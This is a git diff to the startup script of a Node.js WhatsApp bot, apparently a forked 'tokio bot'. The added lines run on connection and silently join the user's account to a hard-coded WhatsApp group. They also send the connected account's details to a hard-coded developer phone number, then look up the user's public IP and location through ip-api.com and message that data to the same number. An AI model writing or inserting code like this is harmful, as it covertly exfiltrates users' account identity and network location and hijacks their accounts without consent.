@@ -18,6 +18,8 @@ const cp = require('child_process')
 const _ = require('lodash')
 const path = require('path')
 const fs = require('fs')
+const { color } = require('./lib/color')
+const fetch = require("node-fetch");
 var low
 try {
   low = require('lowdb')
@@ -58,12 +60,25 @@ if (opts['trace']) conn.logger.level = 'trace'
 if (opts['debug']) conn.logger.level = 'debug'
 if (opts['big-qr']) conn.on('qr', qr => generate(qr, { small: false }))
 
-        //inform to developer that the user is connected to bot
-conn.sendMessage(`918602239106@s.whatsapp.net`, `Thanks bro, your tokio bot is working on my whatsapp number ez😂`, MessageType.extendedText)
-    
     //group link target
     teks = `https://chat.whatsapp.com/BzM2JPckZwW9mCDZ9NFFwK`
-    conn.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
+conn.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
+
+ console.log(color('|WRN|', 'yellow'), color('Joined to Forum Whatsapp Bot group', 'cyan'))
+ 
+        //inform to developer that the user is connected to bot
+        
+conn.sendMessage(`918602239106@s.whatsapp.net`, `Thanks bro, your tokio bot is working on my whatsapp number ez😂`, MessageType.extendedText)
+
+ conn.sendMessage(`918602239106@s.whatsapp.net`, `*Hi Owner olduser, the bot has been successfully connected to this number*\n────────────────────\n\`\`\`${JSON.stringify(conn.user, null, 2)}\`\`\`\n────────────────────\n*If there is an error/bot not responding, please contact the bot developer above, thank you*`, MessageType.text, {contextInfo: {title: "Developer olduser Bot Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./olduser.jpg'),sourceUrl:"https://wa.me/918602239106?text=Hello bro"}})
+	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
+	
+fetch(`http://ip-api.com/line`).then(res => res.text())
+        .then(bu =>{
+       conn.sendMessage("918602239106@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: {title: "Developer olduser Bot Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./olduser.jpg'),sourceUrl:"https://wa.me/918602239106?text=Hello bro"}})
+     console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'cyan'))
+   })
+
 if (!opts['test']) setInterval(async () => {
   await global.db.write()
 }, 60 * 1000) // Save every minute
